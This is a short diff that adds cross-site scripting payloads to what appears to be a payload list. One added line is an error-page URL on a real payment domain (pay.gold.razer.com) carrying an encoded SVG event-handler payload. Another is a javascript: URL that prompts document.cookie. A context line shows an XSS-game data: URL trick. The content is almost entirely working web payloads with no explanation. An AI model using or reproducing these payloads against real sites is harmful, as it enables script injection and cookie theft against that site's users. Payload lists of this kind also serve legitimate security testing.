@@ -3,7 +3,9 @@
 
 
 //
-
+https://pay.gold.razer.com/Error/Uyt2ZXF0UjZLM0dvMHA4eUFHMDVoZEtrdWxjdzNTeTlYMnpLR0NiOVRmND0?err=%3Csvg%20onpointerenter=z=alert,z(document.domain)%3E
+//
+javascript:prompt(document.cookie)//
 //
 https://xss-game.appspot.com/level6/frame#data:text/plain,alert()
 // URL embed
